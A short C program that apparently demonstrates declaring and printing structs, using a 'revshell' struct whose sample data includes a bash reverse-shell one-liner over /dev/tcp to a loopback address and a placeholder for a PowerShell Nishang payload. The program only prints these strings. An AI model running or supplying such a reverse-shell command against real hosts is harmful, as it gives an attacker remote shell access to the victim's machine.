#include <stdio.h>

// Declaring a struct
struct revshell {
  int id;
  char name[50];
  char payload[200];
};

int main(void) {

  // Using a struct
  struct revshell bash_devtcp = {
    1,
    "bash_devtcp",
    "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1"
  };

  struct revshell ps_nishang = {
    2,
    "ps_nishang",
    "crazy nishang stuff..."
  };

  // Printing a struct
  printf("ID:       %d\n", bash_devtcp.id);
  printf("Name:     %s\n", bash_devtcp.name);
  printf("Payload:  %s\n", bash_devtcp.payload);

  // Printing a struct
  printf("ID:       %d\n", ps_nishang.id);
  printf("Name:     %s\n", ps_nishang.name);
  printf("Payload:  %s\n", ps_nishang.payload);

  return 0;

}

